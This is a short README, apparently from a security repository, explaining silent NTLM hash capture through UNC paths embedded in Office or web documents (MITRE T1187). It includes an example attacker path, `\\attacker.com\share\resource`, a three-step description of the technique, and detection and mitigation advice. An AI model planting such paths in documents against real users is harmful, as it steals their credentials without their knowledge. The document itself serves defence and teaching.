# Silent Credential Capture (WebDAV/NTLM)

> **⚠️ DISCLAIMER**: Educational purposes ONLY. Do not use without authorization.

## Overview
Documents the technique of embedding UNC paths in Office documents to silently trigger
NTLM authentication without any visible prompts to the user.

## How It Works
1. Word/PDF/HTML document contains reference to `\\attacker.com\share\resource`
2. When document opens, Windows automatically attempts NTLM authentication
3. NTLM hash transmitted to attacker server — no user interaction needed

## MITRE ATT&CK
- **T1187** — Forced Authentication (Collection)

## Detection
- Monitor for outbound SMB connections (port 445) to external IPs
- Alert on NTLM authentication attempts to non-internal hosts
- Network traffic analysis for SMB to internet

## Mitigation
- Block outbound SMB (ports 445, 139) at perimeter firewall
- Configure Windows to restrict NTLM: `RestrictSendingNTLMTraffic = 2`
- Prefer Kerberos authentication
- Use Credential Guard

## Files
- `smb-trigger.py` — Script showing how to set up an SMB listener (educational)

## References
- [MITRE T1187](https://attack.mitre.org/techniques/T1187/)
